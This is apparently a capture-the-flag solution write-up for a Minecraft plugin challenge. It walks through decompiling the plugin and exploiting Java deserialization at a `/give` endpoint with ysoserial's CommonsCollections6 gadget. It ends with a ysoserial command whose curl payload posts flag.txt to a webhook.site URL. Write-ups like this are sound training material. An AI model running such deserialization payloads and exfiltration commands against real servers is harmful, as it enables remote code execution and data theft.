Steps to solve:

- Use jadx-gui or similar tools to decompile the plugin .jar file
- The plugin allows users to use the `/givediamond` command to give themselves or other people diamonds, and the `gendiamondb64` command to generate a serialized `PacketGiveDiamond` object. 
- The server also exposes port `8081` at the `/give` endpoint which allows external parties to donate diamonds to players in the game. To interact with it, you need to send a POST request with `content-type = application/json` and `x-api-key = "change_this_to_a_secure_key"`. Then send a json object with the `serialization_data` field set to the base64 payload.
- Notice that `PacketGiveDiamond` displays deserialization vulnerabilities since it uses `ObjectInputStream` and `ObjectOutputStream`. Therefore we can use the `ysoserial` tool to obtain payloads to send to the `/give` endpoint.
- After trial and error, notice that only the CommonsCollection6 gadget works. (participants are expected to deploy their own local minecraft servers to test this)
- For example, `java -jar ysoserial-all.jar CommonsCollections6 'curl http://webhook...' | base64` will trigger the webhook. From here, obtaining an RCE and reading `flag.txt` is trivial.
- One payload that works is `java -jar ysoserial-all.jar CommonsCollections6 'curl -X POST -d @flag.txt https://webhook.site/35a090cf-0e56-480b-b87a-b5ee33f8a959' | base64`
